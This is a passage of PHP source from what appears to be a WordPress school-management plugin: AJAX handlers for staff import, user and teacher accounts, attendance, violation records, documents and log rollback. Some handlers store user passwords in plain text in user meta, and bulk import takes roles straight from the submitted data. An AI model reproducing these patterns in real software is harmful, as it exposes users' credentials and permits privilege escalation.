        update_user_meta($user_id, 'eess_school_name', sanitize_text_field($_POST['institution']));
        update_user_meta($user_id, 'eess_department', sanitize_text_field($_POST['department']));
        if (!empty($_POST['specialization'])) {
            update_user_meta($user_id, 'sm_specialization', sanitize_text_field($_POST['specialization']));
        }

        // Handle profile photo upload if provided
        if (!empty($_FILES['profile_photo']['name'])) {
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            require_once(ABSPATH . 'wp-admin/includes/image.php');
            require_once(ABSPATH . 'wp-admin/includes/media.php');

            $attachment_id = media_handle_upload('profile_photo', 0);
            if (!is_wp_error($attachment_id)) {
                $photo_url = wp_get_attachment_url($attachment_id);
                update_user_meta($user_id, 'eess_profile_photo', $photo_url);
            }
        }

        clean_user_cache($user_id);
        wp_cache_flush();

        SM_Logger::log('إضافة موظف معلق', "تم إنشاء حساب موظف معلق باسم: {$_POST['display_name']} للرتبة: {$_POST['user_role']}");
        wp_send_json_success(array('user_id' => $user_id));
    }

    public function ajax_bulk_import_employees() {
        $user = wp_get_current_user();
        $roles = (array) $user->roles;
        $is_admin = in_array('administrator', $roles) || current_user_can('manage_options');
        $is_sys_admin = in_array('sm_system_admin', $roles);
        $is_hr = in_array('sm_hr', $roles) || current_user_can('manage_hr');

        if (!$is_admin && !$is_sys_admin && !$is_hr) {
            wp_send_json_error('غير مصرح لك بالوصول.');
        }

        if (!wp_verify_nonce($_POST['nonce'], 'eess_hr_add_employee_nonce')) {
            wp_send_json_error('انتهت صلاحية الجلسة، يرجى تحديث الصفحة.');
        }

        $records = isset($_POST['records']) ? json_decode(stripslashes($_POST['records']), true) : array();
        if (empty($records) || !is_array($records)) {
            wp_send_json_error('لا توجد سجلات مستوردة صالحة.');
        }

        $success_count = 0;
        $duplicate_count = 0;

        foreach ($records as $row) {
            $name = sanitize_text_field($row['name']);
            $email = sanitize_email($row['email']);
            $emp_num = sanitize_text_field($row['emp_num']);
            $dept = sanitize_text_field($row['dept']);
            $spec = sanitize_text_field($row['specialization']);
            $phone = sanitize_text_field($row['phone']);
            $role = sanitize_text_field($row['role']);
            $school = sanitize_text_field($row['school']);

            // Validate mandatory fields
            if (empty($name) || empty($email) || empty($role)) {
                continue;
            }

            // Check if user exists by email
            if (email_exists($email)) {
                $duplicate_count++;
                continue;
            }

            // Generate unique username
            $username = strstr($email, '@', true);
            if (empty($username)) $username = 'emp_' . rand(1000, 9999);
            while (username_exists($username)) {
                $username .= rand(0, 9);
            }

            $password = wp_generate_password(12, false);

            $user_id = wp_insert_user(array(
                'user_login' => $username,
                'user_email' => $email,
                'display_name' => $name,
                'user_pass' => $password,
                'role' => $role
            ));

            if (is_wp_error($user_id)) {
                continue;
            }

            // Set approved approval status for bulk-imported employees
            update_user_meta($user_id, 'eess_approval_status', 'approved');
            update_user_meta($user_id, 'eess_employee_number', $emp_num);
            update_user_meta($user_id, 'eess_department', $dept);
            update_user_meta($user_id, 'sm_specialization', $spec);
            update_user_meta($user_id, 'sm_phone', $phone);
            update_user_meta($user_id, 'eess_school_name', $school);
            update_user_meta($user_id, 'eess_hr_employment_status', 'active');
            update_user_meta($user_id, 'sm_temp_pass', $password);

            // Synchronize with organizational assignments
            global $wpdb;
            if (!empty($school)) {
                $school_id = $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}eess_schools WHERE name = %s", $school));
                if ($school_id) {
                    update_user_meta($user_id, 'eess_school_id', $school_id);
                    $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
                    $wpdb->insert("{$wpdb->prefix}eess_user_assignments", array(
                        'user_id' => $user_id,
                        'institution_id' => 1,
                        'school_id' => $school_id
                    ));
                }
            }

            clean_user_cache($user_id);
            $success_count++;
        }

        wp_cache_flush();

        SM_Logger::log('استيراد جماعي للموظفين', "تم استيراد ($success_count) موظف بنجاح، وتجاهل ($duplicate_count) بسبب تكرار البريد.");

        wp_send_json_success(array(
            'imported' => $success_count,
            'duplicates' => $duplicate_count
        ));
    }

    public function ajax_update_generic_user() {
        if (!current_user_can('إدارة_المستخدمين')) wp_send_json_error('Unauthorized');
        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_user_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'sm_teacher_action')) wp_send_json_error('Security check failed');

        $user_id = intval($_POST['edit_user_id']);

        $target_user = get_userdata($user_id);
        if ($target_user && $target_user->user_email === 'info@eess.online') {
            wp_send_json_error('عفواً، لا يمكن تعديل أو تغيير حساب مدير النظام المحمي والمدعوم ذاتياً.');
        }

        $user_data = array(
            'ID' => $user_id,
            'display_name' => sanitize_text_field($_POST['display_name'])
        );
        if (!empty($_POST['user_email']) && is_email($_POST['user_email'])) {
            $user_data['user_email'] = sanitize_email($_POST['user_email']);
        }
        if (!empty($_POST['user_pass'])) {
            $user_data['user_pass'] = $_POST['user_pass'];
        }
        $result = wp_update_user($user_data);
        if (is_wp_error($result)) wp_send_json_error($result->get_error_message());
        
        if (!empty($_POST['specialization'])) {
            update_user_meta($user_id, 'sm_specialization', sanitize_text_field($_POST['specialization']));
        }
        if (isset($_POST['employee_number'])) {
            update_user_meta($user_id, 'eess_employee_number', sanitize_text_field($_POST['employee_number']));
        }
        if (isset($_POST['department'])) {
            update_user_meta($user_id, 'eess_department', sanitize_text_field($_POST['department']));
        }

        $school_id = isset($_POST['institution']) ? intval($_POST['institution']) : 0;
        if ($school_id) {
            global $wpdb;
            $school_name = $wpdb->get_var($wpdb->prepare("SELECT name FROM {$wpdb->prefix}eess_schools WHERE id = %d", $school_id));
            if ($school_name) {
                update_user_meta($user_id, 'eess_school_name', $school_name);
                update_user_meta($user_id, 'eess_school_id', $school_id);
                $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
                $wpdb->insert("{$wpdb->prefix}eess_user_assignments", array(
                    'user_id' => $user_id,
                    'institution_id' => 1,
                    'school_id' => $school_id
                ));
            }
        }

        SM_Settings::change_user_role($user_id, sanitize_text_field($_POST['user_role']), $_POST);

        if (isset($_POST['delete_photo_flag']) && $_POST['delete_photo_flag'] === '1') {
            delete_user_meta($user_id, 'eess_profile_photo');
        }

        if (!empty($_FILES['profile_photo']['name'])) {
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            require_once(ABSPATH . 'wp-admin/includes/image.php');
            require_once(ABSPATH . 'wp-admin/includes/media.php');

            $attachment_id = media_handle_upload('profile_photo', 0);
            if (!is_wp_error($attachment_id)) {
                $photo_url = wp_get_attachment_url($attachment_id);
                update_user_meta($user_id, 'eess_profile_photo', $photo_url);
            }
        }

        clean_user_cache($user_id);
        wp_cache_flush();
        
        SM_Logger::log('تعديل بيانات مستخدم', "تم تحديث بيانات المستخدم: {$_POST['display_name']} (ID: $user_id)");
        wp_send_json_success('Updated');
    }

    public function ajax_add_teacher() {
        if (!current_user_can('إدارة_المستخدمين')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_teacher_action')) wp_send_json_error('Security check failed');

        $pass = $_POST['user_pass'];
        if (empty($pass)) {
            $pass = '';
            for($i=0; $i<10; $i++) $pass .= rand(0,9);
        }

        $username = sanitize_user($_POST['user_login']);
        $email = (!empty($_POST['user_email']) && is_email($_POST['user_email'])) ? sanitize_email($_POST['user_email']) : ($username . '@school-system.local'); // Automated

        $user_data = array(
            'user_login' => $username,
            'user_email' => $email,
            'display_name' => sanitize_text_field($_POST['display_name']),
            'user_pass' => $pass,
            'role' => sanitize_text_field($_POST['role'] ?: 'sm_teacher')
        );
        $user_id = wp_insert_user($user_data);
        if (is_wp_error($user_id)) wp_send_json_error($user_id->get_error_message());

        update_user_meta($user_id, 'sm_temp_pass', $pass);
        update_user_meta($user_id, 'sm_teacher_id', sanitize_text_field($_POST['teacher_id']));
        update_user_meta($user_id, 'sm_phone', sanitize_text_field($_POST['phone']));

        if (!empty($_POST['specialization'])) {
            update_user_meta($user_id, 'sm_specialization', sanitize_text_field($_POST['specialization']));
        }

        if (isset($_POST['assigned'])) {
            $assigned = array_map('sanitize_text_field', $_POST['assigned']);
            if ($_POST['role'] === 'sm_teacher') {
                update_user_meta($user_id, 'sm_assigned_sections', $assigned);
            } elseif ($_POST['role'] === 'sm_supervisor') {
                update_user_meta($user_id, 'sm_supervised_classes', $assigned);
            }
        }

        wp_send_json_success($user_id);
    }

    public function ajax_update_profile() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_profile_action')) wp_send_json_error('Security check failed');

        $user_id = get_current_user_id();
        $user = wp_get_current_user();
        $is_restricted = in_array('sm_student', (array)$user->roles) || in_array('sm_parent', (array)$user->roles);

        $user_data = array(
            'ID' => $user_id
        );

        if (!$is_restricted) {
            $user_data['display_name'] = sanitize_text_field($_POST['display_name']);
            $user_data['user_email'] = sanitize_email($_POST['user_email']);
        }

        if (!empty($_POST['user_pass'])) {
            $user_data['user_pass'] = $_POST['user_pass'];
            update_user_meta($user_id, 'sm_temp_pass', $_POST['user_pass']); // Store as visible
        }

        if (count($user_data) <= 1) {
            wp_send_json_error('No data to update');
        }

        $result = wp_update_user($user_data);
        if (is_wp_error($result)) wp_send_json_error($result->get_error_message());
        else wp_send_json_success('Profile updated');
    }

    public function ajax_bulk_delete() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security check failed');

        global $wpdb;
        $type = sanitize_text_field($_POST['delete_type']);
        $count = 0;

        switch ($type) {
            case 'students':
                $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_students");
                $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_records");
                SM_Logger::log('مسح كافة الطلاب والسجلات', 'إجراء جماعي');
                break;
            case 'teachers':
                $teachers = get_users(array('role' => 'sm_teacher'));
                foreach ($teachers as $t) {
                    wp_delete_user($t->ID);
                    $count++;
                }
                SM_Logger::log('مسح كافة المعلمين', 'إجراء جماعي');
                break;
            case 'parents':
                $parents = get_users(array('role' => 'sm_parent'));
                foreach ($parents as $p) {
                    wp_delete_user($p->ID);
                    $count++;
                }
                SM_Logger::log('مسح كافة أولياء الأمور', 'إجراء جماعي');
                break;
            case 'records':
                $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_records");
                SM_Logger::log('مسح كافة المخالفات', 'إجراء جماعي');
                break;
        }

        wp_send_json_success('تم مسح البيانات بنجاح');
    }

    public function ajax_eess_restrict_student_account() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_الطلاب') && !current_user_can('manage_options') && !current_user_can('manage_students'))) {
            wp_send_json_error('عفواً، لا تمتلك الصلاحية لتقييد حساب الطالب.');
        }

        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action')) {
            wp_send_json_error('فشل التوثيق الأمني.');
        }

        $student_id = intval($_POST['student_id'] ?? 0);
        if (!$student_id) wp_send_json_error('معرف الطالب غير صحيح.');

        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) wp_send_json_error('الطالب غير موجود.');

        global $wpdb;
        $wpdb->update("{$wpdb->prefix}sm_students", array('status' => 'inactive'), array('id' => $student_id));

        // Sync WP user meta status if linked account exists
        $national_id = $student->national_id;
        $student_code = $student->student_code;
        $user_id = 0;
        if (!empty($national_id)) $user_id = username_exists($national_id);
        if (!$user_id && !empty($student_code)) $user_id = username_exists($student_code);

        if ($user_id) {
            update_user_meta($user_id, 'sm_account_status', 'restricted');
            update_user_meta($user_id, 'eess_account_status', 'restricted');
        }

        SM_Logger::log('تقييد حساب طالب', "تم تقييد/تعطيل حساب الطالب: {$student->name} (ID: $student_id)");
        wp_send_json_success(array('message' => 'تم تقييد / تعطيل حساب الطالب بنجاح.'));
    }

    public function ajax_eess_request_student_password_change() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_الطلاب') && !current_user_can('manage_options') && !current_user_can('manage_students'))) {
            wp_send_json_error('عفواً، لا تمتلك الصلاحية لإرسال طلب تغيير كلمة المرور.');
        }

        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action')) {
            wp_send_json_error('فشل التوثيق الأمني.');
        }

        $student_id = intval($_POST['student_id'] ?? 0);
        if (!$student_id) wp_send_json_error('معرف الطالب غير صحيح.');

        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) wp_send_json_error('الطالب غير موجود.');

        $national_id = $student->national_id;
        $student_code = $student->student_code;
        $user_id = 0;
        if (!empty($national_id)) $user_id = username_exists($national_id);
        if (!$user_id && !empty($student_code)) $user_id = username_exists($student_code);

        if ($user_id) {
            update_user_meta($user_id, 'eess_must_change_password', '1');
            SM_Logger::log('إصدار طلب تغيير كلمة مرور', "تم إصدار طلب إجباري لتغيير كلمة المرور للحساب المرتبط بالطالب: {$student->name}");
            wp_send_json_success(array('message' => 'تم إرسال وتفعيل طلب تغيير كلمة المرور الإجباري للطالب عند تسجيل الدخول القادم.'));
        } else {
            wp_send_json_error('لم يتم العثور على حساب مستخدم مخصص لهذا الطالب.');
        }
    }

    public function ajax_eess_send_message_to_student() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_الطلاب') && !current_user_can('manage_options') && !current_user_can('manage_students'))) {
            wp_send_json_error('عفواً، لا تمتلك الصلاحية لإرسال رسائل للطلاب.');
        }

        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action')) {
            wp_send_json_error('فشل التوثيق الأمني.');
        }

        $student_id = intval($_POST['student_id'] ?? 0);
        $message = sanitize_textarea_field($_POST['message'] ?? '');

        if (!$student_id || empty($message)) {
            wp_send_json_error('يرجى تحديد الطالب وإدخال نص الرسالة.');
        }

        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) wp_send_json_error('الطالب غير موجود.');

        $national_id = $student->national_id;
        $student_code = $student->student_code;
        $receiver_id = 0;
        if (!empty($national_id)) $receiver_id = username_exists($national_id);
        if (!$receiver_id && !empty($student_code)) $receiver_id = username_exists($student_code);

        global $wpdb;
        $inserted = $wpdb->insert("{$wpdb->prefix}sm_messages", array(
            'sender_id'   => get_current_user_id(),
            'receiver_id' => $receiver_id ?: 0,
            'student_id'  => $student_id,
            'message'     => $message,
            'status'      => 'unread',
            'created_at'  => current_time('mysql')
        ));

        if ($inserted) {
            SM_Logger::log('إرسال رسالة رسمية لطالب', "تم إرسال رسالة للطالب: {$student->name} (ID: $student_id)");
            wp_send_json_success(array('message' => 'تم إرسال الرسالة للطالب بنجاح وتوثيقها بصفحة دخوله.'));
        } else {
            wp_send_json_error('فشل حفظ الرسالة في قاعدة البيانات.');
        }
    }

    public function ajax_eess_mark_message_read() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $msg_id = intval($_POST['message_id'] ?? 0);
        if (!$msg_id) wp_send_json_error('معرف الرسالة غير صحيح.');

        global $wpdb;
        $wpdb->update(
            "{$wpdb->prefix}sm_messages",
            array('status' => 'read'),
            array('id' => $msg_id, 'receiver_id' => get_current_user_id())
        );

        wp_send_json_success();
    }

    public function ajax_get_students_attendance() {
        $class_name = sanitize_text_field($_POST['class_name'] ?? '');
        $section = sanitize_text_field($_POST['section'] ?? '');
        $date = sanitize_text_field($_POST['date'] ?? current_time('Y-m-d'));
        $code = sanitize_text_field($_POST['security_code'] ?? '');

        // Security Check: Either Staff or Valid Class Code
        $is_staff = is_user_logged_in() && current_user_can('إدارة_الطلاب');

        if (!$is_staff) {
            if (empty($code)) wp_send_json_error('Security code required');

            if (empty($class_name) || empty($section)) {
                // Visitor mode: Search for class by code
                $all_codes = SM_Settings::get_class_security_codes();
                $found_key = array_search($code, $all_codes);
                if (!$found_key) wp_send_json_error('Invalid security code');

                list($class_name, $section) = explode('|', $found_key);
            } else {
                $valid_code = (SM_Settings::get_class_security_code($class_name, $section) === $code);
                if (!$valid_code) wp_send_json_error('Invalid security code');
            }
        }

        if (empty($class_name) || empty($section)) wp_send_json_error('Missing class information');

        $students = SM_DB::get_students_attendance($class_name, $section, $date);
        wp_send_json_success($students);
    }

    public function shortcode_class_attendance() {
        $user = wp_get_current_user();
        $roles = (array) $user->roles;
        $is_admin = in_array('administrator', $roles) || current_user_can('manage_options');
        if (!$is_admin && (!SM_Settings::is_section_visible('attendance') || !SM_Settings::user_has_module_capability('attendance'))) {
            return SM_Settings::get_access_restricted_html();
        }
        ob_start();
        include SM_PLUGIN_DIR . 'templates/shortcode-class-attendance.php';
        return ob_get_clean();
    }

    public function ajax_save_attendance() {
        if (!wp_verify_nonce($_POST['nonce'], 'sm_attendance_action')) wp_send_json_error('Security check failed');

        $student_id = intval($_POST['student_id']);
        $status = sanitize_text_field($_POST['status']);
        $date = sanitize_text_field($_POST['date']);
        $code = sanitize_text_field($_POST['security_code'] ?? '');

        // Get student info to check class
        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) wp_send_json_error('Student not found');

        $is_staff = is_user_logged_in() && current_user_can('إدارة_الطلاب');
        $valid_code = (SM_Settings::get_class_security_code($student->class_name, $student->section) === $code);

        if (!$is_staff && !$valid_code) {
            wp_send_json_error('Unauthorized');
        }

        $teacher_id = get_current_user_id(); // 0 for public

        if (SM_DB::save_attendance($student_id, $status, $date, $teacher_id)) {
            wp_send_json_success('Saved');
        } else {
            wp_send_json_error('Failed to save');
        }
    }

    public function ajax_save_attendance_batch() {
        if (!wp_verify_nonce($_POST['nonce'], 'sm_attendance_action')) wp_send_json_error('Security check failed');

        $batch = json_decode(stripslashes($_POST['batch'] ?? '[]'), true);
        if (empty($batch)) wp_send_json_error('Empty batch');

        $first_sid = intval($batch[0]['student_id']);
        $student = SM_DB::get_student_by_id($first_sid);
        if (!$student) wp_send_json_error('Student not found');

        $code = sanitize_text_field($_POST['security_code'] ?? '');
        $is_staff = is_user_logged_in() && current_user_can('إدارة_الطلاب');
        $valid_code = (SM_Settings::get_class_security_code($student->class_name, $student->section) === $code);

        if (!$is_staff && !$valid_code) {
            wp_send_json_error('Unauthorized');
        }

        $date = sanitize_text_field($_POST['date']);
        $teacher_id = get_current_user_id();

        if (!is_array($batch)) wp_send_json_error('Invalid batch data');

        $success_count = 0;
        foreach ($batch as $item) {
            if (SM_DB::save_attendance(intval($item['student_id']), sanitize_text_field($item['status']), $date, $teacher_id)) {
                $success_count++;
            }
        }

        wp_send_json_success($success_count);
    }

    public function ajax_reset_class_code() {
        if (!is_user_logged_in() || !current_user_can('إدارة_الطلاب')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_attendance_action')) wp_send_json_error('Security check failed');

        $grade = sanitize_text_field($_POST['grade']);
        $section = sanitize_text_field($_POST['section']);

        $new_code = SM_Settings::reset_class_security_code($grade, $section);
        wp_send_json_success($new_code);
    }

    public function ajax_toggle_attendance_status() {
        if (!is_user_logged_in() || !current_user_can('إدارة_الطلاب')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_attendance_action')) wp_send_json_error('Security check failed');

        $status = sanitize_text_field($_POST['status']);
        update_option('sm_attendance_manual_status', $status);
        wp_send_json_success();
    }

    public function ajax_filter_violations() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_record_action')) wp_send_json_error('Security check');

        $filters = array();
        if (isset($_POST['student_search'])) $filters['search'] = sanitize_text_field($_POST['student_search']);
        if (isset($_POST['class_filter'])) $filters['class_name'] = sanitize_text_field($_POST['class_filter']);
        if (isset($_POST['section_filter'])) $filters['section'] = sanitize_text_field($_POST['section_filter']);
        if (isset($_POST['type_filter'])) $filters['type'] = sanitize_text_field($_POST['type_filter']);

        $paged = isset($_POST['paged']) ? max(1, intval($_POST['paged'])) : 1;
        $limit = isset($_POST['limit']) ? max(1, intval($_POST['limit'])) : 10;
        $orderby = isset($_POST['orderby']) ? sanitize_text_field($_POST['orderby']) : 'created_at';
        $order = isset($_POST['order']) ? sanitize_text_field($_POST['order']) : 'DESC';

        $total_count = SM_DB::get_records_count($filters);
        $total_pages = max(1, ceil($total_count / $limit));
        if ($paged > $total_pages) {
            $paged = $total_pages;
        }
        $offset = ($paged - 1) * $limit;

        $query_filters = array_merge($filters, array(
            'limit' => $limit,
            'offset' => $offset,
            'orderby' => $orderby,
            'order' => $order
        ));

        $records = SM_DB::get_records($query_filters);

        ob_start();
        include SM_PLUGIN_DIR . 'templates/partials/violations-table-rows.php';
        $rows_html = ob_get_clean();

        wp_send_json_success(array(
            'html' => $rows_html,
            'total' => $total_count,
            'paged' => $paged,
            'limit' => $limit,
            'total_pages' => $total_pages,
            'from' => $total_count > 0 ? $offset + 1 : 0,
            'to' => min($offset + $limit, $total_count)
        ));
    }

    public function ajax_mark_contacted() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_record_action')) wp_send_json_error('Security check');

        $record_id = intval($_POST['record_id']);
        if (SM_DB::mark_record_contacted($record_id)) {
            wp_send_json_success();
        } else {
            wp_send_json_error('Failed to update status');
        }
    }

    public function ajax_add_document() {
        if (!is_user_logged_in()) wp_send_json_error('عفواً، يجب تسجيل الدخول.');
        if (!wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_admin_action')) wp_send_json_error('فشل التوثيق الأمني بالجلسة.');

        $title    = sanitize_text_field($_POST['title'] ?? '');
        $category = sanitize_text_field($_POST['category'] ?? '');
        $file_url = esc_url_raw($_POST['file_url'] ?? '');
        $is_general = !empty($_POST['is_general']);

        if (empty($title) || empty($category)) {
            wp_send_json_error('اسم الوثيقة والتصنيف حقول إلزامية.');
        }

        $user = wp_get_current_user();
        $roles = (array) $user->roles;
        $can_upload_general = in_array('administrator', $roles) || in_array('sm_system_admin', $roles) || in_array('sm_principal', $roles) || in_array('sm_supervisor', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || current_user_can('manage_options');

        if ($is_general && !$can_upload_general) {
            wp_send_json_error('عفواً، يتطلب نشر الوثائق العامة صلاحية مدير المدرسة أو المشرفين أو رئيس القسم.');
        }

        // Validate File Size (max 5MB) and Allowed Extensions (PDF, DOC/DOCX, XLS/XLSX)
        if (!empty($_FILES['doc_file']['name'])) {
            $file = $_FILES['doc_file'];
            if ($file['size'] > 5 * 1024 * 1024) {
                wp_send_json_error('حجم الملف يتجاوز الحد الأقصى المسموح به (5 ميجابايت).');
            }

            $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
            $allowed_exts = array('pdf', 'doc', 'docx', 'xls', 'xlsx');
            if (!in_array($ext, $allowed_exts)) {
                wp_send_json_error('نوع الملف غير مسموح به. يُسمح فقط بملفات PDF, DOC, DOCX, XLS, XLSX.');
            }

            require_once(ABSPATH . 'wp-admin/includes/image.php');
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            require_once(ABSPATH . 'wp-admin/includes/media.php');

            $attachment_id = media_handle_upload('doc_file', 0);
            if (is_wp_error($attachment_id)) {
                wp_send_json_error('فشل رفع الملف: ' . $attachment_id->get_error_message());
            }
            $file_url = wp_get_attachment_url($attachment_id);
        }

        if (empty($file_url)) {
            wp_send_json_error('يرجى اختيار مرفق أو إدخال رابط الملف.');
        }

        global $wpdb;
        $result = $wpdb->insert("{$wpdb->prefix}sm_documents", array(
            'title'       => $title,
            'description' => sanitize_textarea_field($_POST['description'] ?? ''),
            'file_url'    => $file_url,
            'status'      => sanitize_text_field($_POST['status'] ?? 'published'),
            'category'    => $category,
            'created_by'  => get_current_user_id()
        ));

        if ($result) wp_send_json_success();
        else wp_send_json_error('فشل حفظ الوثيقة بقاعدة البيانات.');
    }

    public function ajax_update_document() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_admin_action')) wp_send_json_error('Security');

        global $wpdb;
        $result = $wpdb->update("{$wpdb->prefix}sm_documents", array(
            'title' => sanitize_text_field($_POST['title']),
            'description' => sanitize_textarea_field($_POST['description']),
            'file_url' => esc_url_raw($_POST['file_url']),
            'status' => sanitize_text_field($_POST['status']),
            'category' => sanitize_text_field($_POST['category'] ?? 'الوثائق الإدارية')
        ), array('id' => intval($_POST['doc_id'])));

        if ($result !== false) wp_send_json_success();
        else wp_send_json_error('Failed to update');
    }

    public function ajax_delete_document() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security');

        global $wpdb;
        $result = $wpdb->delete("{$wpdb->prefix}sm_documents", array('id' => intval($_POST['doc_id'])));

        if ($result) wp_send_json_success();
        else wp_send_json_error('Failed to delete');
    }

    public function ajax_save_regulation_settings() {
        if (!current_user_can('manage_options') && !current_user_can('sm_principal') && !current_user_can('sm_supervisor')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_admin_action')) wp_send_json_error('Security');

        $types_raw = explode("\n", str_replace("\r", "", $_POST['violation_types']));
        $types = array();
        foreach ($types_raw as $line) {
            $parts = explode("|", $line);
            if (count($parts) == 2) {
                $types[trim($parts[0])] = trim($parts[1]);
            }
        }
        if (!empty($types)) {
            SM_Settings::save_violation_types($types);
        }
        SM_Settings::save_suggested_actions(array(
            'low' => sanitize_textarea_field($_POST['suggested_low']),
            'medium' => sanitize_textarea_field($_POST['suggested_medium']),
            'high' => sanitize_textarea_field($_POST['suggested_high'])
        ));

        SM_Logger::log('تحديث إعدادات اللائحة', 'قام المستخدم بتحديث أنواع المخالفات العامة واقتراحات الإجراءات.');

        wp_send_json_success();
    }

    public function ajax_save_hierarchical_violations() {
        if (!current_user_can('manage_options') && !current_user_can('sm_principal') && !current_user_can('sm_supervisor')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_admin_action')) wp_send_json_error('Security');

        $processed = array();
        if (isset($_POST['h_viol']) && is_array($_POST['h_viol'])) {
            foreach ($_POST['h_viol'] as $level => $items) {
                $processed[$level] = array();
                foreach ($items as $item) {
                    if (!empty($item['name'])) {
                        $code = !empty($item['code']) ? $item['code'] : 'V'.rand(100,999);
                        $processed[$level][$code] = array(
                            'name' => sanitize_text_field($item['name']),
                            'points' => intval($item['points']),
                            'action' => sanitize_text_field($item['action'])
                        );
                    }
                }
            }
        }
        SM_Settings::save_hierarchical_violations($processed);
        SM_Logger::log('تحديث لائحة المخالفات الهرمية', 'تم تحديث بنود اللائحة والنقاط والإجراءات لجميع المستويات.');

        wp_send_json_success();
    }

    public function ajax_delete_log() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security check failed');

        global $wpdb;
        $log_id = intval($_POST['log_id']);
        $result = $wpdb->delete("{$wpdb->prefix}sm_logs", array('id' => $log_id));

        if ($result) wp_send_json_success();
        else wp_send_json_error('Failed to delete log');
    }

    public function ajax_delete_all_logs() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security check failed');

        global $wpdb;
        $result = $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_logs");

        if ($result !== false) {
            SM_Logger::log('مسح كافة النشاطات', 'قام المستخدم بمسح سجل النشاطات بالكامل');
            wp_send_json_success();
        } else {
            wp_send_json_error('Failed to delete logs');
        }
    }

    public function ajax_rollback_log() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security check failed');

        $log_id = intval($_POST['log_id']);
        global $wpdb;
        $log = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_logs WHERE id = %d", $log_id));

        if (!$log || strpos($log->details, 'ROLLBACK_DATA:') !== 0) {
            wp_send_json_error('لا يمكن استعادة هذه العملية');
        }

        $json = substr($log->details, strlen('ROLLBACK_DATA:'));
        $data_obj = json_decode($json, true);

        if (!$data_obj || !isset($data_obj['table']) || !isset($data_obj['data'])) {
            wp_send_json_error('بيانات الاستعادة تالفة');
        }

        $table = $data_obj['table'];
        $data = $data_obj['data'];

        // Remove 'id' if we want to insert as new, or keep if we want to restore exact ID (risky if ID taken)
        // For students/records, restoring exact ID is better for relations.

        $table_name = $wpdb->prefix . 'sm_' . $table;

        // Check if ID already exists
        $exists = $wpdb->get_var($wpdb->prepare("SELECT id FROM $table_name WHERE id = %d", $data['id']));
        if ($exists) {
            wp_send_json_error('البيانات موجودة بالفعل أو تم استخدام المعرف');
        }

        $result = $wpdb->insert($table_name, $data);

        if ($result) {
            $wpdb->delete("{$wpdb->prefix}sm_logs", array('id' => $log_id)); // Remove log after rollback
            SM_Logger::log('استعادة عملية محذوفة', "الجدول: $table، المعرف الأصلي: {$data['id']}");
            wp_send_json_success('تمت الاستعادة بنجاح');
        } else {
            wp_send_json_error('فشلت عملية الاستعادة في قاعدة البيانات');
        }
    }

    public function ajax_initialize_system() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security check failed');
